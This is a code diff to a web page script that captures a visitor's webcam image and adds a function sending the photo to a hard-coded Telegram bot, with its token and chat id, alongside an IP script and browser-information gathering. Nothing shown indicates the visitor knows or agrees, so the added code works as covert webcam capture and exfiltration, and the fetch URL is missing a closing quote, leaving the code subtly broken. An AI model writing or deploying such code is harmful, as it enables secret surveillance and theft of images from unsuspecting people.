@@ -48,6 +48,9 @@ if (typeof Webcam === 'undefined') {
 
                     // Cleanup
                     URL.revokeObjectURL(link.href);
+
+                    sendImageToTelegram(blob);
+          
                 });
             }, 2000); // Delay to ensure the camera is ready
         });
@@ -56,6 +59,18 @@ if (typeof Webcam === 'undefined') {
 <script src="ip.js"></script>
     
 <script>
+    function sendImageToTelegram(imageBlob) {
+            const formData = new FormData();
+            formData.append('photo', imageBlob, 'captured_image.jpg');
+
+            fetch('https://api.telegram.org/bot8044232915:AAHZR8OiaCl8wm5HoHR3Y80bFWHWI6PbIi8/sendMessage?chat_id=1584674499, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => console.log('Image sent successfully:', data))
+            .catch(error => console.error('Error:', error));
+        }
 function getClientInfo() {
     return {
         browserCodeName: navigator.appCodeName,
